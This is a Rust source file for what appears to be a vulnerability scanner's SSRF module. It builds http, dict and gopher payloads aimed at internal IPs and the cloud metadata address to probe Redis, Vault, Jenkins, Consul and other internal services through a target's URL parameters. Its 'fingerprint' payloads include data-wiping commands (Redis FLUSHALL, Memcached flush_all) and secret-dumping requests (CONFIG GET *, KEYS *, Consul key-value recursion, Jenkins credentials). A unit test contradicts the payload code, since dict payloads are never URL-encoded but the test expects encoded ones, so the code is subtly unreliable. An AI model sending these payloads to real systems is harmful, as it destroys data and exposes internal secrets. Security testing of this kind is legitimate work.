//! Internal Service Probing Module
//!
//! Probes for internal services like Redis, Memcached, Elasticsearch, and databases via SSRF.
//! Uses protocol-specific payloads to detect and fingerprint internal services.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::PayloadRegistry;
use crate::http::client::HttpClient;

/// Internal service definition
#[derive(Debug, Clone)]
pub struct InternalService {
    pub name: &'static str,
    pub default_ports: &'static [u16],
    pub protocols: &'static [ServiceProtocol],
    pub detection_patterns: &'static [&'static str],
    pub fingerprint_payloads: &'static [&'static str],
    pub severity: FindingSeverity,
}

/// Service protocol for probing
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ServiceProtocol {
    Http,
    Dict,
    Gopher,
    Raw,
}

/// Internal service probing module
pub struct InternalServicesModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    services: Vec<InternalService>,
}

impl InternalServicesModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            services: Self::define_services(),
        }
    }

    /// Define all internal services to probe
    fn define_services() -> Vec<InternalService> {
        vec![
            // Redis
            InternalService {
                name: "Redis",
                default_ports: &[6379, 6380, 16379],
                protocols: &[ServiceProtocol::Dict, ServiceProtocol::Gopher, ServiceProtocol::Raw],
                detection_patterns: &[
                    "redis_version", "redis_mode", "connected_clients", "used_memory",
                    "role", "master_repl_offset", "repl_backlog_active", "aof_enabled",
                    "rdb_changes_since_last_save", "total_connections_received",
                ],
                fingerprint_payloads: &[
                    "INFO",
                    "CLIENT LIST",
                    "CONFIG GET *",
                    "KEYS *",
                    "DBSIZE",
                    "FLUSHALL",
                ],
                severity: FindingSeverity::Critical,
            },
            
            // Memcached
            InternalService {
                name: "Memcached",
                default_ports: &[11211, 11212],
                protocols: &[ServiceProtocol::Dict, ServiceProtocol::Gopher, ServiceProtocol::Raw],
                detection_patterns: &[
                    "STAT version", "STAT pid", "STAT uptime", "STAT time",
                    "STAT pointer_size", "STAT rusage_user", "STAT rusage_system",
                    "STAT curr_connections", "STAT total_connections", "STAT cmd_get",
                    "STAT cmd_set", "STAT get_hits", "STAT get_misses",
                ],
                fingerprint_payloads: &[
                    "stats",
                    "version",
                    "items",
                    "flush_all",
                ],
                severity: FindingSeverity::High,
            },
            
            // Elasticsearch
            InternalService {
                name: "Elasticsearch",
                default_ports: &[9200, 9300, 9201, 9202],
                protocols: &[ServiceProtocol::Http, ServiceProtocol::Dict, ServiceProtocol::Gopher],
                detection_patterns: &[
                    "cluster_name", "cluster_uuid", "version", "number", "build_flavor",
                    "build_type", "build_hash", "build_date", "build_snapshot",
                    "lucene_version", "minimum_wire_compatibility_version",
                    "minimum_index_compatibility_version",
                ],
                fingerprint_payloads: &[
                    "/",
                    "/_cluster/health",
                    "/_cat/indices?v",
                    "/_cat/nodes?v",
                    "/_cat/shards?v",
                    "/_nodes/stats",
                    "/_snapshot/_all",
                ],
                severity: FindingSeverity::Critical,
            },
            
            // MongoDB
            InternalService {
                name: "MongoDB",
                default_ports: &[27017, 27018, 27019],
                protocols: &[ServiceProtocol::Dict, ServiceProtocol::Raw],
                detection_patterns: &[
                    "ismaster", "maxBsonObjectSize", "maxMessageSizeBytes",
                    "maxWriteBatchSize", "localTime", "logicalSessionTimeoutMinutes",
                    "connectionId", "minWireVersion", "maxWireVersion",
                    "readOnly", "ok",
                ],
                fingerprint_payloads: &[
                    "ismaster",
                    "buildInfo",
                    "serverStatus",
                    "listDatabases",
                ],
                severity: FindingSeverity::Critical,
            },
            
            // PostgreSQL
            InternalService {
                name: "PostgreSQL",
                default_ports: &[5432, 5433],
                protocols: &[ServiceProtocol::Raw],
                detection_patterns: &[
                    "PostgreSQL", "FATAL", "no pg_hba.conf entry",
                    "database", "user", "SSL", "authentication",
                ],
                fingerprint_payloads: &[
                    "SELECT version();",
                    "SELECT current_database();",
                    "SELECT current_user;",
                ],
                severity: FindingSeverity::Critical,
            },
            
            // MySQL/MariaDB
            InternalService {
                name: "MySQL",
                default_ports: &[3306, 3307, 3308],
                protocols: &[ServiceProtocol::Raw],
                detection_patterns: &[
                    "mysql_native_password", "caching_sha2_password",
                    "Host", "is not allowed to connect", "Access denied",
                    "MariaDB", "MySQL", "protocol_version",
                ],
                fingerprint_payloads: &[
                    "SELECT VERSION();",
                    "SELECT USER();",
                    "SELECT DATABASE();",
                    "SHOW DATABASES;",
                ],
                severity: FindingSeverity::Critical,
            },
            
            // Cassandra
            InternalService {
                name: "Cassandra",
                default_ports: &[9042, 9160, 7000, 7001, 7199],
                protocols: &[ServiceProtocol::Raw],
                detection_patterns: &[
                    "Cassandra", "cql_version", "thrift_version",
                    "release_version", "cluster_name", "partitioner",
                    "snitch", "data_center", "rack",
                ],
                fingerprint_payloads: &[
                    "SELECT * FROM system.local;",
                    "SELECT cluster_name FROM system.local;",
                    "DESCRIBE KEYSPACES;",
                ],
                severity: FindingSeverity::High,
            },
            
            // RabbitMQ
            InternalService {
                name: "RabbitMQ",
                default_ports: &[5672, 15672, 25672],
                protocols: &[ServiceProtocol::Http, ServiceProtocol::Raw],
                detection_patterns: &[
                    "RabbitMQ", "AMQP", "management", "overview",
                    "queue_totals", "message_stats", "nodes",
                ],
                fingerprint_payloads: &[
                    "/api/overview",
                    "/api/nodes",
                    "/api/queues",
                    "/api/exchanges",
                    "/api/connections",
                ],
                severity: FindingSeverity::High,
            },
            
            // Kafka
            InternalService {
                name: "Kafka",
                default_ports: &[9092, 9093, 2181],
                protocols: &[ServiceProtocol::Raw],
                detection_patterns: &[
                    "kafka", "broker", "topic", "partition", "leader",
                    "replica", "isr", "controller", "zookeeper",
                ],
                fingerprint_payloads: &[
                    "metadata",
                    "api_versions",
                ],
                severity: FindingSeverity::High,
            },
            
            // Zookeeper
            InternalService {
                name: "ZooKeeper",
                default_ports: &[2181, 2182, 2183, 2888, 3888],
                protocols: &[ServiceProtocol::Raw],
                detection_patterns: &[
                    "ZooKeeper", "version", "latency", "received", "sent",
                    "connections", "outstanding", "mode", "node_count",
                ],
                fingerprint_payloads: &[
                    "ruok",
                    "stat",
                    "srvr",
                    "cons",
                    "crst",
                    "dump",
                    "envi",
                    "conf",
                ],
                severity: FindingSeverity::High,
            },
            
            // Consul
            InternalService {
                name: "Consul",
                default_ports: &[8500, 8300, 8301, 8302, 8600],
                protocols: &[ServiceProtocol::Http, ServiceProtocol::Raw],
                detection_patterns: &[
                    "Consul", "consul", "service", "node", "datacenter",
                    "leader", "known_leader", "last_contact", "checks",
                ],
                fingerprint_payloads: &[
                    "/v1/catalog/services",
                    "/v1/catalog/nodes",
                    "/v1/agent/self",
                    "/v1/agent/members",
                    "/v1/health/state/any",
                    "/v1/kv/?recurse",
                ],
                severity: FindingSeverity::High,
            },
            
            // Etcd
            InternalService {
                name: "Etcd",
                default_ports: &[2379, 2380, 4001, 7001],
                protocols: &[ServiceProtocol::Http, ServiceProtocol::Raw],
                detection_patterns: &[
                    "etcd", "cluster_id", "member_id", "raft_term",
                    "raft_index", "leader", "version", "go_version",
                ],
                fingerprint_payloads: &[
                    "/version",
                    "/health",
                    "/v2/keys/?recursive=true",
                    "/v3/kv/range",
                    "/metrics",
                ],
                severity: FindingSeverity::High,
            },
            
            // Vault
            InternalService {
                name: "Vault",
                default_ports: &[8200, 8201],
                protocols: &[ServiceProtocol::Http],
                detection_patterns: &[
                    "Vault", "sealed", "initialized", "standby",
                    "cluster_name", "cluster_id", "version", "storage_type",
                ],
                fingerprint_payloads: &[
                    "/v1/sys/health",
                    "/v1/sys/init",
                    "/v1/sys/seal-status",
                    "/v1/sys/leader",
                    "/v1/sys/mounts",
                ],
                severity: FindingSeverity::Critical,
            },
            
            // Jenkins
            InternalService {
                name: "Jenkins",
                default_ports: &[8080, 8443, 50000],
                protocols: &[ServiceProtocol::Http],
                detection_patterns: &[
                    "Jenkins", "jenkins", "crumb", "csrf", "hudson",
                    "build", "job", "queue", "executor", "slave",
                ],
                fingerprint_payloads: &[
                    "/api/json",
                    "/script",
                    "/manage",
                    "/credentials/",
                    "/asynchPeople/",
                ],
                severity: FindingSeverity::High,
            },
            
            // GitLab
            InternalService {
                name: "GitLab",
                default_ports: &[80, 443, 8080, 8443],
                protocols: &[ServiceProtocol::Http],
                detection_patterns: &[
                    "GitLab", "gitlab", "sign_in", "new_user_session",
                    "projects", "groups", "pipeline", "merge_request",
                ],
                fingerprint_payloads: &[
                    "/api/v4/version",
                    "/api/v4/projects",
                    "/api/v4/users",
                    "/dashboard",
                    "/admin",
                ],
                severity: FindingSeverity::High,
            },
            
            // Docker Registry
            InternalService {
                name: "Docker Registry",
                default_ports: &[5000, 5001],
                protocols: &[ServiceProtocol::Http],
                detection_patterns: &[
                    "Docker", "registry", "repositories", "tags",
                    "manifests", "blobs", "catalog", "v2/",
                ],
                fingerprint_payloads: &[
                    "/v2/",
                    "/v2/_catalog",
                    "/v2/_catalog?n=100",
                ],
                severity: FindingSeverity::Medium,
            },
            
            // Prometheus
            InternalService {
                name: "Prometheus",
                default_ports: &[9090, 9091],
                protocols: &[ServiceProtocol::Http],
                detection_patterns: &[
                    "Prometheus", "prometheus", "metrics", "targets",
                    "rules", "alerts", "graph", "query", "tsdb",
                ],
                fingerprint_payloads: &[
                    "/api/v1/query?query=up",
                    "/api/v1/targets",
                    "/api/v1/rules",
                    "/api/v1/alerts",
                    "/metrics",
                    "/config",
                    "/flags",
                ],
                severity: FindingSeverity::Medium,
            },
            
            // Grafana
            InternalService {
                name: "Grafana",
                default_ports: &[3000, 3001],
                protocols: &[ServiceProtocol::Http],
                detection_patterns: &[
                    "Grafana", "grafana", "dashboard", "datasource",
                    "panel", "alert", "org", "user", "login",
                ],
                fingerprint_payloads: &[
                    "/api/health",
                    "/api/datasources",
                    "/api/dashboards/home",
                    "/api/org",
                    "/api/users",
                    "/login",
                ],
                severity: FindingSeverity::Medium,
            },
            
            // Kibana
            InternalService {
                name: "Kibana",
                default_ports: &[5601, 5602],
                protocols: &[ServiceProtocol::Http],
                detection_patterns: &[
                    "Kibana", "kibana", "elasticsearch", "discover",
                    "visualize", "dashboard", "management", "dev_tools",
                ],
                fingerprint_payloads: &[
                    "/api/status",
                    "/api/spaces/space",
                    "/api/saved_objects/_find",
                    "/app/kibana",
                ],
                severity: FindingSeverity::Medium,
            },
            
            // Solr
            InternalService {
                name: "Solr",
                default_ports: &[8983, 8984],
                protocols: &[ServiceProtocol::Http],
                detection_patterns: &[
                    "Solr", "solr", "core", "collection", "shard",
                    "replica", "leader", "overseer", "zk",
                ],
                fingerprint_payloads: &[
                    "/solr/admin/info/system",
                    "/solr/admin/cores",
                    "/solr/admin/collections",
                    "/solr/admin/cores?action=STATUS",
                ],
                severity: FindingSeverity::Medium,
            },
            
            // ActiveMQ
            InternalService {
                name: "ActiveMQ",
                default_ports: &[8161, 61616, 61613],
                protocols: &[ServiceProtocol::Http, ServiceProtocol::Raw],
                detection_patterns: &[
                    "ActiveMQ", "activemq", "broker", "queue", "topic",
                    "connection", "producer", "consumer", "enqueue",
                ],
                fingerprint_payloads: &[
                    "/admin/",
                    "/api/broker",
                    "/api/queues",
                    "/api/topics",
                ],
                severity: FindingSeverity::Medium,
            },
        ]
    }

    /// Test a single service on a specific port with a specific protocol
    async fn test_service_port(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        service: &InternalService,
        ip: &str,
        port: u16,
        protocol: ServiceProtocol,
    ) -> Result<Option<Finding>, ModuleError> {
        let payloads = self.generate_protocol_payloads(ip, port, protocol, service);
        
        for payload in payloads {
            let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&payload));
            
            let response = self.http_client
                .get(&test_url)
                .timeout(Duration::from_millis(5000))
                .send()
                .await;

            if let Ok(resp) = response {
                let status = resp.status().as_u16();
                let headers: Vec<(String, String)> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();
                let body = resp.bytes().await
                    .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

                if self.is_service_detected(&body, service) {
                    let evidence = self.create_service_evidence(
                        &test_url, &body, &headers, status, service, ip, port, protocol, &payload
                    );
                    
                    let finding = Finding::new(
                        "internal_service_ssrf",
                        service.severity,
                        format!("Internal Service SSRF ({})", service.name),
                        format!("SSRF allows access to internal {} service on {}:{} via parameter '{}'", 
                            service.name, ip, port, param_name),
                        &ctx.target_url,
                    )
                    .with_method("GET")
                    .with_payload(payload)
                    .with_evidence(evidence)
                    .with_confidence(90)
                    .with_tags(vec!["ssrf", "internal-service", service.name.to_lowercase(), format!("port-{}", port)])
                    .with_cwe("CWE-918")
                    .with_agent_id(ctx.agent_id);

                    return Ok(Some(finding));
                }
            }
        }

        Ok(None)
    }

    /// Generate protocol-specific payloads for a service
    fn generate_protocol_payloads(
        &self,
        ip: &str,
        port: u16,
        protocol: ServiceProtocol,
        service: &InternalService,
    ) -> Vec<String> {
        let mut payloads = Vec::new();
        let base = format!("{}:{}", ip, port);

        match protocol {
            ServiceProtocol::Http => {
                for path in service.fingerprint_payloads {
                    payloads.push(format!("http://{}{}", base, path));
                }
            }
            ServiceProtocol::Dict => {
                for cmd in service.fingerprint_payloads {
                    payloads.push(format!("dict://{}/{}", base, cmd));
                }
            }
            ServiceProtocol::Gopher => {
                for cmd in service.fingerprint_payloads {
                    let encoded = urlencoding::encode(cmd);
                    payloads.push(format!("gopher://{}/_{}", base, encoded));
                }
            }
            ServiceProtocol::Raw => {
                // Raw TCP payloads would need a different approach
                // For HTTP-based SSRF, we can try HTTP to the raw port
                for cmd in service.fingerprint_payloads {
                    payloads.push(format!("http://{}/{}", base, cmd));
                }
            }
        }

        payloads
    }

    /// Check if response indicates the target service
    fn is_service_detected(&self, body: &Bytes, service: &InternalService) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        for pattern in service.detection_patterns {
            if body_str.to_lowercase().contains(&pattern.to_lowercase()) {
                return true;
            }
        }
        
        false
    }

    /// Create evidence for service detection
    fn create_service_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        service: &InternalService,
        ip: &str,
        port: u16,
        protocol: ServiceProtocol,
        payload: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("Internal service SSRF: service={}, ip={}, port={}, protocol={:?}, payload='{}'", 
                service.name, ip, port, protocol, payload),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 90,
        }
    }

    /// Test common internal IPs for a service
    async fn test_service_on_ips(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        service: &InternalService,
    ) -> Result<Vec<Finding>, ModuleError> {
        let mut findings = Vec::new();
        let internal_ips = [
            "127.0.0.1",
            "10.0.0.1",
            "10.0.0.2",
            "172.16.0.1",
            "172.16.0.2",
            "192.168.1.1",
            "192.168.1.2",
            "192.168.0.1",
            "169.254.169.254",
            "[::1]",
        ];

        for ip in &internal_ips {
            for port in service.default_ports {
                for protocol in service.protocols {
                    if let Some(finding) = self.test_service_port(ctx, param_name, service, ip, *port, *protocol).await? {
                        findings.push(finding);
                    }
                }
            }
        }

        Ok(findings)
    }
}

#[async_trait]
impl VulnerabilityModule for InternalServicesModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("Internal Services SSRF module initialized with {} services", self.services.len());
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "internal_services_ssrf",
                "Internal Service Probing via SSRF",
                "Probes for internal services like Redis, Memcached, Elasticsearch, and databases via SSRF",
                Severity::Critical,
                CheckCategory::ServerSideRequestForgery,
            )
            .with_budget(ResourceBudget::advanced())
            .with_god_mode(true)
            .with_tags(vec!["ssrf", "internal-service", "redis", "memcached", "elasticsearch", "mongodb", "postgresql", "mysql", "cassandra", "rabbitmq", "kafka", "zookeeper", "consul", "etcd", "vault"])
            .with_references(vec![
                "https://portswigger.net/web-security/ssrf",
                "https://redis.io/commands/",
                "https://github.com/memcached/memcached/wiki/Protocol",
                "https://www.elastic.co/guide/en/elasticsearch/reference/current/rest-apis.html",
                "https://www.mongodb.com/docs/manual/reference/method/",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata().requires_god_mode && !ctx.god_mode {
            return false;
        }
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(300);

        // Extract parameters
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Priority services to test first (highest impact)
        let priority_services = ["Redis", "Memcached", "Elasticsearch", "MongoDB", "PostgreSQL", "MySQL", "Vault"];
        
        // Test priority services first
        for service_name in &priority_services {
            if let Some(service) = self.services.iter().find(|s| s.name == *service_name) {
                for param in &params {
                    if request_count >= max_requests / 2 {
                        break;
                    }
                    
                    let service_findings = self.test_service_on_ips(&ctx, param, service).await?;
                    findings.extend(service_findings);
                    request_count += service.default_ports.len() * service.protocols.len() * 10; // estimate
                }
            }
        }

        // Test remaining services
        if request_count < max_requests * 3 / 4 {
            for service in &self.services {
                if priority_services.contains(&service.name) {
                    continue; // Already tested
                }
                
                for param in &params {
                    if request_count >= max_requests * 3 / 4 {
                        break;
                    }
                    
                    let service_findings = self.test_service_on_ips(&ctx, param, service).await?;
                    findings.extend(service_findings);
                    request_count += service.default_ports.len() * service.protocols.len() * 5; // estimate
                }
            }
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        30 // High priority - critical findings
    }

    fn dependencies(&self) -> &[&str] {
        &["basic_ssrf"]
    }
}

impl InternalServicesModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_define_services() {
        let services = InternalServicesModule::define_services();
        
        assert!(!services.is_empty());
        assert!(services.iter().any(|s| s.name == "Redis"));
        assert!(services.iter().any(|s| s.name == "Memcached"));
        assert!(services.iter().any(|s| s.name == "Elasticsearch"));
        assert!(services.iter().any(|s| s.name == "MongoDB"));
        assert!(services.iter().any(|s| s.name == "PostgreSQL"));
        assert!(services.iter().any(|s| s.name == "MySQL"));
        assert!(services.iter().any(|s| s.name == "Cassandra"));
        assert!(services.iter().any(|s| s.name == "RabbitMQ"));
        assert!(services.iter().any(|s| s.name == "Kafka"));
        assert!(services.iter().any(|s| s.name == "ZooKeeper"));
        assert!(services.iter().any(|s| s.name == "Consul"));
        assert!(services.iter().any(|s| s.name == "Etcd"));
        assert!(services.iter().any(|s| s.name == "Vault"));
    }

    #[test]
    fn test_redis_detection_patterns() {
        let services = InternalServicesModule::define_services();
        let redis = services.iter().find(|s| s.name == "Redis").unwrap();
        
        assert!(redis.detection_patterns.contains(&"redis_version"));
        assert!(redis.detection_patterns.contains(&"connected_clients"));
        assert!(redis.default_ports.contains(&6379));
        assert!(redis.protocols.contains(&ServiceProtocol::Dict));
        assert!(redis.protocols.contains(&ServiceProtocol::Gopher));
    }

    #[test]
    fn test_elasticsearch_detection_patterns() {
        let services = InternalServicesModule::define_services();
        let es = services.iter().find(|s| s.name == "Elasticsearch").unwrap();
        
        assert!(es.detection_patterns.contains(&"cluster_name"));
        assert!(es.detection_patterns.contains(&"version"));
        assert!(es.default_ports.contains(&9200));
        assert!(es.protocols.contains(&ServiceProtocol::Http));
    }

    #[test]
    fn test_generate_protocol_payloads_http() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = InternalServicesModule::new(http_client, analysis_ctx, payload_registry);
        
        let service = module.services.iter().find(|s| s.name == "Elasticsearch").unwrap();
        let payloads = module.generate_protocol_payloads("127.0.0.1", 9200, ServiceProtocol::Http, service);
        
        assert!(payloads.iter().any(|p| p.contains("http://127.0.0.1:9200/")));
        assert!(payloads.iter().any(|p| p.contains("/_cluster/health")));
    }

    #[test]
    fn test_generate_protocol_payloads_dict() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = InternalServicesModule::new(http_client, analysis_ctx, payload_registry);
        
        let service = module.services.iter().find(|s| s.name == "Redis").unwrap();
        let payloads = module.generate_protocol_payloads("127.0.0.1", 6379, ServiceProtocol::Dict, service);
        
        assert!(payloads.iter().any(|p| p.contains("dict://127.0.0.1:6379/INFO")));
        assert!(payloads.iter().any(|p| p.contains("dict://127.0.0.1:6379/CLIENT%20LIST")));
    }

    #[test]
    fn test_is_service_detected() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = InternalServicesModule::new(http_client, analysis_ctx, payload_registry);
        
        let service = module.services.iter().find(|s| s.name == "Redis").unwrap();
        let body = Bytes::from("redis_version:6.2.0\nconnected_clients:10");
        
        assert!(module.is_service_detected(&body, service));
        
        let body2 = Bytes::from("some other content");
        assert!(!module.is_service_detected(&body2, service));
    }

    #[test]
    fn test_extract_parameters() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = InternalServicesModule::new(http_client, analysis_ctx, payload_registry);
        
        let params = module.extract_parameters("http://example.com/api?user=test&id=123");
        assert_eq!(params, vec!["user", "id"]);
    }
}